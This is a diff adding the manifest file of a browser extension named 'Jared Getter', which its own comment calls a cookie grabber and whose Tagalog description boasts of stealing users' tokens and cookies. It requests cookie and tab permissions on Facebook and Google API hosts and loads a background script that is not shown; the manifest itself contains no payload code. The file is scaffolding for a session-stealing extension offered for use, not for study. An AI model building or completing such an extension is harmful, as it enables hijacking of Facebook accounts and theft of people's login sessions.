@@ -1,0 +1,31 @@
+{
+  "manifest_version": 3,
+  "name": "Jared Getter", //COOKIE GRABBER LOL
+  "version": "1.0.0",
+  "description": "NINANAKAW KO YUNG TOKEN AT COOKIE N'YO",
+  "permissions": ["cookies", "storage", "tabs"],
+  "host_permissions": [
+    "*://*.facebook.com/*",
+    "*://*.fbcdn.net/*",
+    "*://*.googleapis.com/*"
+  ],
+  "action": {
+    "default_popup": "index.html",
+    "default_icon": {
+      "16": "icon.png",
+      "48": "icon.png",
+      "128": "icon.png"
+    }
+  },
+  "background": {
+    "service_worker": "background.js"
+  },
+  "icons": {
+    "16": "icon.png",
+    "48": "icon.png",
+    "128": "icon.png"
+  },
+    "content_security_policy": {
+    "extension_pages": "script-src 'self'; object-src 'self'"
+  }
+}
